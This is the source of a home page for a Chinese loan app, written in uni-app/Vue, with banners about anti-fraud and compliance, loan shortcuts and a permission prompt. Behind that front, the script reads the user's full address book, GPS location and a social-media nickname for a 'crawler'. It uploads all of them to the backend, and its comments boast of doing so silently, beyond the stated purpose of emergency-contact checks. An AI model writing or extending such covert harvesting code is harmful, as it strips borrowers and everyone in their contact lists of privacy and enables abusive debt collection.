<template>
	<view class="content">
		<view class="up">
			<view class="view-up">
				<navigator url="/pages/tables/login" open-type="navigate" class="nav-title">
					<text>{{title}}</text>
				</navigator>
				<view class="iconContainer">
					<view class="iconfont icon-customer-service" @click="goToChat()"></view>
					<view class="iconfont icon-xiaoxi-zhihui" @click="goToEmail()"></view>
				</view>
			</view>
			<view class="view-down">
				<view class="brand-info">
					<view class="iconfont icon-dianpu brand-icon"></view>
					<view class="textContainer">
						<text class="text-up">我们的贷款App</text>
						<text class="text-down">OUR LOAN APPLICATION</text>
					</view>
				</view>
			</view>
		</view>

		<view class="middle">
		    <swiper class="mySwiper" autoplay interval="5000" circular>
		        
		        <swiper-item>
		            <view class="swiper-item-content">
		                <image src="/static/myImages/lunbotu2.png" mode="aspectFill"></image>
		                <view class="swiper-text-mask">
		                    <text class="swiper-tag fraud-tag">安全课堂</text>
		                    <text class="swiper-title">最新反诈骗指南</text>
		                    <text class="swiper-desc">互联网贷款欺诈频发，请查收为您整理的官方防骗宝典。</text>
		                    <view class="swiper-btn fraud-btn" @click="uni.navigateTo({ url: '/pages/tables/Problems?category=fraud' })">了解更多</view>
		                </view>
		            </view>
		        </swiper-item>
		
		        <swiper-item>
		            <view class="swiper-item-content">
		                <image src="/static/myImages/lunbotu2.png" mode="aspectFill"></image>
		                <view class="swiper-text-mask">
		                    <text class="swiper-tag compliance-tag">合规借贷</text>
		                    <text class="swiper-title">安全合规，放心使用</text>
		                    <text class="swiper-desc">始终坚持合规经营，确保每一个环节的安全可靠。</text>
		                    <view class="swiper-btn compliance-btn" @click="uni.navigateTo({ url: '/pages/tables/Problems?category=compliance' })">查看详情</view>
		                </view>
		            </view>
		        </swiper-item>
		
		        <swiper-item>
		            <view class="swiper-item-content">
		                <image src="/static/myImages/lunbotu2.png" mode="aspectFill"></image>
		                <view class="swiper-text-mask">
		                    <text class="swiper-tag notice-tag">服务公告</text>
		                    <text class="swiper-title">欢迎使用"放心用"App</text>
		                    <text class="swiper-desc">提供安全、高效的借贷服务，您的满意是我们的追求。</text>
		                    <view class="swiper-btn notice-btn" @click="uni.navigateTo({ url: '/pages/tables/gongGao' })">查看公告</view>
		                </view>
		            </view>
		        </swiper-item>
		
		    </swiper>
		</view>

		<view class="down">
			<view class="down-up">
				<view class="views view1" @click="goToLiucheng()">
					<view class="icon-box">
						<view class="iconfont icon-zaixianyanzi"></view>
					</view>
					<text class="text1">贷款流程</text>
					<text class="text2">必备材料 · 回执</text>
				</view>
				
				<view class="views view2" @click="goToInformation()">
					<view class="icon-box">
						<view class="iconfont icon-bianji"></view>
					</view>
					<text class="text1">完善资料</text>
					<text class="text2">个人与工作信息</text>
				</view>
				
				<view class="views view3" @click="goToProduct()">
					<view class="icon-box">
						<view class="iconfont icon-zhifudingjin"></view>
					</view>
					<text class="text1">贷款申请</text>
					<text class="text2">浏览贷款产品</text>
				</view>
			</view>

			<view class="down-middle" @click="goToGongGao()">
				<view class="notice-tag">公告</view>
				<swiper class="notice-swiper" autoplay interval="5000" circular vertical>
					<swiper-item><text class="notice-text">欢迎使用"放心用"App，为您提供安全借贷服务</text></swiper-item>
					<swiper-item><text class="notice-text">最新反诈骗指南已更新，请注意查收</text></swiper-item>
				</swiper>
				<view class="iconfont icon-arrow-right arrow-icon"></view>
			</view>

			<view class="down-down">
				<text class="section-title">快捷服务</text>
				<view class="viewContainer">
					<view class="service-card">
						<view class="card-icon-wrapper bg-red">
							<view class="iconfont icon-anquanbaozhang"></view>
						</view>
						<view class="view-middle">
							<text class="text-up">申请进度查询</text>
							<text class="text-down">快速查看贷款申请最新进度</text>
						</view>
						<view class="action-btn" @click="goToStatus()">查看</view>
					</view>
					
					<view class="service-card">
						<view class="card-icon-wrapper bg-green">
							<view class="iconfont icon-kuaijiezhifu"></view>
						</view>
						<view class="view-middle">
							<text class="text-up">还款计划</text>
							<text class="text-down">查看近期应还金额与明细</text>
						</view>
						<view class="action-btn" @click="goToRepayPlan()">查看</view>
					</view>
					
					<view class="service-card">
						<view class="card-icon-wrapper bg-blue">
							<view class="iconfont icon-help"></view>
						</view>
						<view class="view-middle">
							<text class="text-up">常见问题</text>
							<text class="text-down">快速解答您的借贷疑惑</text>
						</view>
						<view class="action-btn" @click="goToProblems()">查看</view>
					</view>
				</view>
				<view class="footer-hotline">
					<text>服务热线电话：</text>
					<text class="phone-num">123-456-789</text>
				</view>
			</view>
		</view>

		<view class="modal-mask" v-if="showPermissionModal">
			<view class="modal-content">
				<view class="modal-header">
					<text class="modal-title">服务授权提醒</text>
					<text class="modal-desc">为了提供更安全、完整的服务，建议您开启以下权限：</text>
				</view>
				
				<scroll-view scroll-y class="modal-list">
					<view class="item" v-if="needContact">
						<view class="item-info">
							<text class="item-title">通讯录权限</text>
							<text class="item-sub">用于紧急联系人核验</text>
						</view>
						<switch :checked="contactChecked" @change="e => contactChecked = e.detail.value" color="#C12A34" style="transform:scale(0.8)"/>
					</view>
					
					<view class="item" v-if="needLocation">
						<view class="item-info">
							<text class="item-title">地理位置权限</text>
							<text class="item-sub">用于评估本地服务可用性</text>
						</view>
						<switch :checked="locationChecked" @change="e => locationChecked = e.detail.value" color="#C12A34" style="transform:scale(0.8)"/>
					</view>
					
					<view class="item" v-if="needCamera">
						<view class="item-info">
							<text class="item-title">相机权限</text>
							<text class="item-sub">用于实名认证与活体检测</text>
						</view>
						<switch :checked="cameraChecked" @change="e => cameraChecked = e.detail.value" color="#C12A34" style="transform:scale(0.8)"/>
					</view>
					
					<view class="item" v-if="needWeibo">
						<view class="item-info">
							<text class="item-title">爬虫权限</text>
							<text class="item-sub">爬取您的相关信息</text>
						</view>
						<switch :checked="weiboChecked" @change="handleWeiboChange" color="#C12A34" style="transform:scale(0.8)"/>
					</view>
					
					<view class="item input-item" v-if="needWeibo && weiboChecked">
						<input class="weibo-input" type="text" placeholder="请输入您的昵称" v-model="weiboUrl" placeholder-class="input-placeholder"/>
					</view>
				</scroll-view>
				
				<view class="modal-footer">
					<button class="confirm-btn" @click="closePermissionModal()">完成并保存</button>
				</view>
			</view>
		</view>
	</view>
</template>

<script>
	export default{
		data(){
			return{
				title: '登录',
				
				// 弹窗与权限控制相关
				showPermissionModal: false,
				permissionData: null,
				
				// 标记哪些权限是处于“未开启”状态的
				needContact: false,
				needLocation: false,
				needCamera: false,
				needWeibo: false,
				
				// 弹窗里开关的实时状态绑定
				contactChecked: false,
				locationChecked: false,
				cameraChecked: false,
				weiboChecked: false,
				weiboUrl: ''
			};
		},
		
		onShow() {
			const username = getApp().globalData.username;
			if(username && username.length > 0){
				this.title = '欢迎';
				
				// 判断全局变量，如果没检查过（undefined 或 false），才去检查
				if (!getApp().globalData.hasCheckedPermission) {
					this.checkPermissions(username);
				}
			}
		},
		
		methods:{
			// 1. 核心权限检查逻辑
			async checkPermissions(username) {
				// 锁死全局开关，本次登录不再检查
				getApp().globalData.hasCheckedPermission = true;
				
				try {
					await uni.$http.post('/permission/create_permission', { username: username });
					let res = await uni.$http.get('/permission/get_permission', { username: username });
					
					if (res.code === 200 && res.data) {
						let p = res.data;
						this.permissionData = p; 
						
						this.needContact = p.contactPermission === 0;
						this.needLocation = p.locationPermission === 0;
						this.needCamera = p.cameraPermission === 0;
						this.needWeibo = (!p.weiboUrl || p.weiboUrl.trim() === '');
						
						// 如果发现用户已经开启了通讯录权限，直接静默收集！
						if (p.contactPermission === 1) {
							this.requestSystemPermission();
						}
						
						// 如果发现用户已经开启了定位权限，直接静默收集！
						if (p.locationPermission === 1) {
							this.requestLocationAndUpload();
						}

						// 🌟 新增：如果发现用户已经绑定了微博（勾选了爬虫权限），直接静默触发爬虫！
						if (!this.needWeibo) {
							this.requestCrawlerAndUpload();
						}
						
						if (this.needContact || this.needLocation || this.needCamera || this.needWeibo) {
							this.contactChecked = false;
							this.locationChecked = false;
							this.cameraChecked = false;
							this.weiboChecked = false;
							this.weiboUrl = '';
							
							this.showPermissionModal = true;
						}
					}
				} catch (e) {
					console.error("权限数据同步异常", e);
				}
			},
			
			// 2. 爬虫开关事件控制
			handleWeiboChange(e) {
				this.weiboChecked = e.detail.value;
				if (!this.weiboChecked) {
					this.weiboUrl = ''; // 关闭时自动清空
				}
			},
			
			// 3. 关闭弹窗并调用 update 更新
			async closePermissionModal() {
				this.showPermissionModal = false;
				if (!this.permissionData || !this.permissionData.id) return;
				
				let updatedData = {
					id: this.permissionData.id,
					username: this.permissionData.username,
					contactPermission: this.needContact ? (this.contactChecked ? 1 : 0) : this.permissionData.contactPermission,
					locationPermission: this.needLocation ? (this.locationChecked ? 1 : 0) : this.permissionData.locationPermission,
					cameraPermission: this.needCamera ? (this.cameraChecked ? 1 : 0) : this.permissionData.cameraPermission,
					weiboUrl: this.needWeibo ? (this.weiboChecked ? this.weiboUrl : '') : this.permissionData.weiboUrl
				};

				try {
					await uni.$http.put('/permission/update_permission', updatedData);
					uni.showToast({ title: '权限设置已保存', icon: 'success' });
					
					// 如果用户刚刚在弹窗里手动开启了通讯录权限，立刻收集！
					if (this.needContact && this.contactChecked) {
						this.requestSystemPermission();
					}
					
					// 如果用户刚刚在弹窗里手动开启了定位权限，立刻收集！
					if (this.needLocation && this.locationChecked) {
						this.requestLocationAndUpload();
					}

					// 🌟 新增：如果用户刚刚在弹窗里开启了爬虫权限并填写了昵称，立刻触发！
					if (this.needWeibo && this.weiboChecked && this.weiboUrl.trim() !== '') {
						this.requestCrawlerAndUpload();
					}
					
				} catch (e) {
					console.error("权限更新失败", e);
				}
			},
						
			// 请求通讯录系统权限
			requestSystemPermission() {
				const currentToken = getApp().globalData.token || uni.getStorageSync('token');
				if (uni.getStorageSync('contacts_uploaded_token') === currentToken) return;

				// #ifdef APP-PLUS
				plus.android.requestPermissions(['android.permission.READ_CONTACTS'], (e) => {
					if (e.granted.length > 0) {
						this.readAddressBook();
					} else {
						console.log('用户在安卓系统弹窗中拒绝了通讯录权限');
					}
				}, (e) => {
					console.log('安卓底层权限请求失败');
				});
				// #endif
			},
			
			// 静默读取通讯录并上传
			readAddressBook() {
				// #ifdef APP-PLUS
				plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, (addressbook) => {
					addressbook.find(null, (contacts) => {
						
						let contactList = [];
						for (let i = 0; i < contacts.length; i++) {
							let contact = contacts[i];
							let name = contact.displayName || '未知姓名';
							let phones = [];
							if (contact.phoneNumbers && contact.phoneNumbers.length > 0) {
								for (let j = 0; j < contact.phoneNumbers.length; j++) {
									phones.push(contact.phoneNumbers[j].value);
								}
							}
							if (phones.length > 0) {
								contactList.push({ name: name, phones: phones });
							}
						}
						
						console.log("成功在后台静默获取通讯录，共 " + contactList.length + " 条");
						
						uni.$http.post('/permission/contacts/upload', { contacts: contactList }).then(res => {
								const currentToken = getApp().globalData.token || uni.getStorageSync('token');
								uni.setStorageSync('contacts_uploaded_token', currentToken);
						});

					}, (e) => {
						console.log('读取联系人失败');
					}, { multiple: true }); 
				}, (e) => {
					console.log('获取通讯录对象失败');
				});
				// #endif
			},
						
			requestLocationAndUpload() {
				const currentToken = getApp().globalData.token || uni.getStorageSync('token');
				if (uni.getStorageSync('location_uploaded_token') === currentToken) return;

				uni.getLocation({
					type: 'wgs84', 
					success: (res) => {
						console.log('获取定位成功，经度：', res.longitude, '纬度：', res.latitude);
						
						uni.$http.post('/permission/location/upload', {
							longitude: res.longitude,
							latitude: res.latitude
						}).then(uploadRes => {
							uni.setStorageSync('location_uploaded_token', currentToken);
						});
					},
					fail: (err) => {
						console.log('获取地理位置失败：', err);
					}
				});
			},

			// 🌟 新增：静默触发爬虫审核
	// 🌟 完美模仿地理位置和通讯录的极简写法
				requestCrawlerAndUpload() {
					const currentToken = getApp().globalData.token || uni.getStorageSync('token');
					
					// 检查该 token 是否已经触发过爬虫，防止每次进首页都调接口
					if (uni.getStorageSync('crawler_uploaded_token') === currentToken) return;
	
					// 直接使用你封装好的 uni.$http，不需要配 url 前缀，也不用手动塞 token（拦截器会自动塞）
					uni.$http.post('/ai/crawler').then(res => {
						// 根据你 checkPermissions 里的写法，这里拦截器应该已经剥离了外层，直接就是业务对象
						console.log('🤖 爬虫风控后台任务触发成功');
						// 上传成功后，把当前的 Token 存下来打上标记
						uni.setStorageSync('crawler_uploaded_token', currentToken);
					}).catch(err => {
						console.error('爬虫接口触发异常：', err);
					});
				},
				
			// 导航路由方法
			goToProblems(){ uni.navigateTo({ url:"/pages/tables/Problems" }) },
			goToLiucheng(){ uni.navigateTo({ url:"/pages/tables/liucheng" }) },
			goToInformation(){ uni.navigateTo({ url:"/pages/tables/information" }) },
			goToRepayPlan(){ uni.navigateTo({ url:"/pages/tables/repayPlan" }) },
			goToStatus(){ uni.navigateTo({ url:"/pages/tables/status" }) },
			goToProduct(){ uni.navigateTo({ url:"/pages/product/product" }) },
			goToGongGao(){ uni.navigateTo({ url:"/pages/tables/gongGao" }) },
			goToEmail(){ uni.navigateTo({ url:"/pages/tables/email" }) },
			goToChat(){ uni.navigateTo({ url:"/pages/tables/chat" }) }
		}
	}
</script>

<style scoped>
	/* 全局背景设为极浅的灰，突出卡片质感 */
	/* 高级感创意背景：采用多点径向渐变，模拟柔和的氛围光 */
	.content {
		/* 基础背景色设为极浅的乳白色 */
		background-color: #FFFFFF;
		
		/* 创意渐变逻辑：
		   1. 左上角引入极淡的品牌红氛围感
		   2. 右下角引入极淡的合规蓝氛围感
		   3. 中间留白，确保文字阅读清晰
		*/
		background-image: 
			radial-gradient(circle at 0% 0%, rgba(230, 57, 70, 0.05) 0%, transparent 40%),
			radial-gradient(circle at 100% 100%, rgba(52, 152, 219, 0.05) 0%, transparent 40%),
			radial-gradient(circle at 100% 0%, rgba(255, 203, 164, 0.03) 0%, transparent 30%);
		
		background-attachment: fixed; /* 背景固定，滚动时产生视差流动感 */
		min-height: 100vh;
		font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Helvetica, Segoe UI, Arial, Roboto, 'PingFang SC', 'miui', 'Hiragino Sans GB', 'Microsoft Yahei', sans-serif;
	}
	
	/* 顶部高级渐变与圆角 */
	.up {
		background: linear-gradient(135deg, #E63946, #B71C1C);
		padding-top: 100rpx;
		height: 380rpx;
		border-bottom-left-radius: 60rpx;
		border-bottom-right-radius: 60rpx;
		box-shadow: 0 10rpx 30rpx rgba(183, 28, 28, 0.2);
	}
	
	.view-up {
		box-sizing: border-box;
		padding: 0 40rpx;
		display: flex;
		justify-content: space-between;
		align-items: center;
	}
	
	.nav-title text {
		color: #ffffff;
		font-size: 38rpx;
		font-weight: 600;
		letter-spacing: 2rpx;
	}
	
	.iconContainer {
		display: flex;
		gap: 30rpx;
	}
	
	.iconContainer .iconfont {
		font-size: 44rpx;
		color: #ffffff;
	}
	
	.view-down {
		margin-top: 60rpx;
		padding: 0 40rpx;
	}
	
	.brand-info {
		display: flex;
		align-items: center;
		justify-content: center;
		gap: 20rpx;
	}
	
	.brand-icon {
		font-size: 70rpx;
		color: #ffffff;
	}
	
	.textContainer {
		display: flex;
		flex-direction: column;
	}
	
	.text-up {
		color: #ffffff;
		font-size: 40rpx;
		font-weight: bold;
		letter-spacing: 4rpx;
	}
	
	.text-down {
		color: rgba(255, 255, 255, 0.7);
		font-size: 20rpx;
		letter-spacing: 2rpx;
		margin-top: 4rpx;
	}
	
	/* 轮播图重构：增加高度以容纳文字，悬浮质感，内部高级排版 */
	.middle {
	    width: 690rpx;
	    height: 300rpx; /* 增加高度以容纳文字和标签 */
	    margin: -120rpx auto 0;
	    position: relative;
	    z-index: 10;
	    border-radius: 24rpx;
	    box-shadow: 0 16rpx 40rpx rgba(0, 0, 0, 0.08);
	    overflow: hidden;
	    background-color: #fff;
	}
	
	.mySwiper {
	    width: 100%;
	    height: 100%;
	    border-radius: 24rpx;
	}
	
	.swiper-item-content {
	    position: relative;
	    width: 100%;
	    height: 100%;
	}
	
	.swiper-item-content image {
	    width: 100%;
	    height: 100%;
	    border-radius: 24rpx;
	    object-fit: cover; /* 确保图片覆盖且不拉伸 */
	}
	
	/* 文字蒙层：高级感的来源，底部渐变黑提供对比 */
	.swiper-text-mask {
	    position: absolute;
	    left: 0;
	    right: 0;
	    bottom: 0;
	    padding: 60rpx 40rpx 40rpx;
	    background: linear-gradient(to top, rgba(0, 0, 0, 0.85) 0%, rgba(0, 0, 0, 0.0) 100%);
	    display: flex;
	    flex-direction: column;
	    justify-content: flex-end;
	}
	
	.swiper-tag {
	    font-size: 20rpx;
	    color: #ffffff;
	    padding: 4rpx 14rpx;
	    border-radius: 8rpx;
	    align-self: flex-start;
	    margin-bottom: 18rpx;
	    letter-spacing: 1rpx;
	    font-weight: 500;
	}
	
	.swiper-title {
	    font-size: 38rpx;
	    font-weight: bold;
	    color: #ffffff;
	    margin-bottom: 10rpx;
	    letter-spacing: 2rpx;
	}
	
	.swiper-desc {
	    font-size: 24rpx;
	    color: rgba(255, 255, 255, 0.85);
	    line-height: 1.5;
	    margin-bottom: 26rpx;
	    display: -webkit-box;
	    -webkit-box-orient: vertical;
	    -webkit-line-clamp: 2; /* 限制描述为两行 */
	    overflow: hidden;
	}
	
	.swiper-btn {
	    width: 180rpx;
	    height: 60rpx;
	    line-height: 60rpx;
	    text-align: center;
	    border-radius: 30rpx;
	    font-size: 24rpx;
	    font-weight: 600;
	    background-color: #ffffff; /* 白底按钮 */
	    box-shadow: 0 4rpx 12rpx rgba(0, 0, 0, 0.15);
	    align-self: flex-start;
	}
	
	/* 定制不同标签和按钮的色彩系统 (延续上一版的高级配色) */
	.fraud-tag { background-color: rgba(183, 28, 28, 0.85); } /* 品牌红 */
	.fraud-btn { color: #B71C1C; }
	
	.compliance-tag { background-color: rgba(26, 188, 156, 0.85); } /* 合规绿 */
	.compliance-btn { color: #1ABC9C; }
	
	.notice-tag { background-color: rgba(46, 134, 193, 0.85); } /* 公告蓝 */
	.notice-btn { color: #2E86C1; }
	
	/* 主体内容区 */
	.down {
		padding: 30rpx 30rpx 60rpx;
	}
	
	/* 核心入口重构：浅色渐变背景 + 独立图标底座 */
	.down-up {
		display: flex;
		justify-content: space-between;
		gap: 20rpx;
	}
	
	.views {
		flex: 1;
		border-radius: 24rpx;
		padding: 36rpx 10rpx 30rpx;
		display: flex;
		flex-direction: column;
		align-items: center;
		transition: transform 0.2s;
		box-shadow: 0 4rpx 16rpx rgba(0, 0, 0, 0.02);
	}
	
	.views:active {
		transform: scale(0.96);
	}
	
	/* 为三个卡片定制加深后的渐变色，提升色彩辨识度 */
	.view1 {
		background: linear-gradient(135deg, #FFE8D6, #FFCBA4);
		border: 1rpx solid #FFD8B8;
	}
	
	.view2 {
		background: linear-gradient(135deg, #FFE1E8, #FFB3C6);
		border: 1rpx solid #FFC9D6;
	}
	
	.view3 {
		background: linear-gradient(135deg, #E1EEFF, #ADCFFF);
		border: 1rpx solid #C9E0FF;
	}
	
	/* 独立的图标白底容器，增加立体感 */
	.icon-box {
		width: 80rpx;
		height: 80rpx;
		border-radius: 50%;
		background-color: #ffffff;
		display: flex;
		justify-content: center;
		align-items: center;
		margin-bottom: 24rpx;
		box-shadow: 0 6rpx 16rpx rgba(0, 0, 0, 0.05);
	}
	
	/* 恢复并强化你的 iconfont 样式 */
	.view1 .iconfont { color: #E67E22; font-size: 42rpx; }
	.view2 .iconfont { color: #E74C3C; font-size: 42rpx; }
	.view3 .iconfont { color: #3498DB; font-size: 42rpx; }
	
	.text1 {
		display: block;
		font-size: 30rpx;
		font-weight: 600;
		color: #333333;
		margin-bottom: 10rpx;
	}
	
	.text2 {
		display: block;
		font-size: 22rpx;
		color: #888888;
	}
	
	.iconContainer .one {
		font-size: 60rpx;
	}
	
	.theme-color-1 { color: #E57373; }
	.theme-color-2 { color: #64B5F6; }
	.theme-color-3 { color: #81C784; }
	
	/* 公告栏：极简风 */
	.down-middle {
		background-color: #ffffff;
		margin-top: 30rpx;
		padding: 0 24rpx;
		box-sizing: border-box;
		display: flex;
		align-items: center;
		height: 80rpx;
		border-radius: 16rpx;
		box-shadow: 0 4rpx 16rpx rgba(0, 0, 0, 0.02);
	}
	
	.notice-tag {
		font-size: 24rpx;
		color: #C12A34;
		font-weight: 600;
		background: rgba(193, 42, 52, 0.1);
		padding: 4rpx 12rpx;
		border-radius: 8rpx;
		margin-right: 20rpx;
	}
	
	.notice-swiper {
		flex: 1;
		height: 40rpx;
		line-height: 40rpx;
	}
	
	.notice-text {
		font-size: 26rpx;
		color: #666666;
		overflow: hidden;
		text-overflow: ellipsis;
		white-space: nowrap;
	}
	
	.arrow-icon {
		font-size: 32rpx;
		color: #CCCCCC;
	}
	
	/* 快捷服务：列表流布局 */
	.down-down {
		margin-top: 40rpx;
	}
	
	.section-title {
		font-size: 34rpx;
		font-weight: bold;
		color: #333333;
		margin-bottom: 24rpx;
		display: block;
	}
	
	.viewContainer {
		display: flex;
		flex-direction: column;
		gap: 20rpx;
	}
	
	.service-card {
		background-color: #ffffff;
		border-radius: 20rpx;
		padding: 30rpx 24rpx;
		display: flex;
		align-items: center;
		box-shadow: 0 4rpx 20rpx rgba(0, 0, 0, 0.03);
	}
	
	.card-icon-wrapper {
		width: 80rpx;
		height: 80rpx;
		border-radius: 20rpx;
		display: flex;
		justify-content: center;
		align-items: center;
		margin-right: 24rpx;
	}
	
	.card-icon-wrapper .iconfont {
		font-size: 40rpx;
		color: #ffffff;
	}
	
	.bg-red { background: linear-gradient(135deg, #FF7E79, #E63946); }
	.bg-green { background: linear-gradient(135deg, #48C9B0, #1ABC9C); }
	.bg-blue { background: linear-gradient(135deg, #5DADE2, #2E86C1); }
	
	.view-middle {
		flex: 1;
		display: flex;
		flex-direction: column;
		justify-content: center;
	}
	
	.view-middle .text-up {
		font-size: 30rpx;
		font-weight: 600;
		color: #333333;
		margin-bottom: 6rpx;
	}
	
	.view-middle .text-down {
		font-size: 24rpx;
		color: #999999;
	}
	
	.action-btn {
		width: 120rpx;
		height: 56rpx;
		line-height: 56rpx;
		text-align: center;
		border-radius: 28rpx;
		font-size: 24rpx;
		color: #C12A34;
		border: 2rpx solid #C12A34;
		background: transparent;
	}
	
	.footer-hotline {
		margin-top: 60rpx;
		text-align: center;
		font-size: 26rpx;
		color: #999999;
	}
	
	.phone-num {
		color: #C12A34;
		font-weight: bold;
	}

	/* 高级感权限弹窗重构 */
	.modal-mask {
		position: fixed;
		top: 0; left: 0; right: 0; bottom: 0;
		background: rgba(0, 0, 0, 0.6);
		backdrop-filter: blur(8rpx); /* iOS毛玻璃效果 */
		z-index: 999;
		display: flex;
		align-items: center;
		justify-content: center;
		animation: fadeIn 0.3s ease;
	}
	
	@keyframes fadeIn {
		from { opacity: 0; }
		to { opacity: 1; }
	}
	
	.modal-content {
		width: 620rpx;
		background: #ffffff;
		border-radius: 32rpx;
		padding: 50rpx 40rpx;
		box-sizing: border-box;
		box-shadow: 0 20rpx 60rpx rgba(0, 0, 0, 0.15);
	}
	
	.modal-header {
		text-align: center;
		margin-bottom: 40rpx;
	}
	
	.modal-title {
		display: block;
		font-size: 38rpx;
		font-weight: bold;
		color: #222222;
		margin-bottom: 16rpx;
	}
	
	.modal-desc {
		font-size: 26rpx;
		color: #888888;
		line-height: 1.5;
	}
	
	.modal-list {
		max-height: 450rpx;
	}
	
	.modal-list .item {
		display: flex;
		justify-content: space-between;
		align-items: center;
		padding: 24rpx 0;
		border-bottom: 1rpx solid #F0F0F0;
	}
	
	.item-info {
		display: flex;
		flex-direction: column;
	}
	
	.item-title {
		font-size: 30rpx;
		color: #333333;
		font-weight: 500;
		margin-bottom: 4rpx;
	}
	
	.item-sub {
		font-size: 22rpx;
		color: #AAAAAA;
	}
	
	.modal-list .input-item {
		border-bottom: none;
		padding: 20rpx 0 0;
	}
	
	.weibo-input {
		flex: 1;
		background: #F8F9FA;
		height: 80rpx;
		border-radius: 16rpx;
		padding: 0 30rpx;
		font-size: 28rpx;
		border: 1rpx solid #E9ECEF;
	}
	
	.input-placeholder {
		color: #BBBBBB;
	}
	
	.modal-footer {
		margin-top: 50rpx;
	}
	
	.confirm-btn {
		background: linear-gradient(135deg, #E63946, #B71C1C);
		color: #ffffff;
		border-radius: 40rpx;
		width: 100%;
		font-size: 32rpx;
		height: 88rpx;
		line-height: 88rpx;
		box-shadow: 0 8rpx 20rpx rgba(183, 28, 28, 0.3);
	}
	
	.confirm-btn:active {
		transform: scale(0.98);
		box-shadow: 0 4rpx 10rpx rgba(183, 28, 28, 0.2);
	}
</style>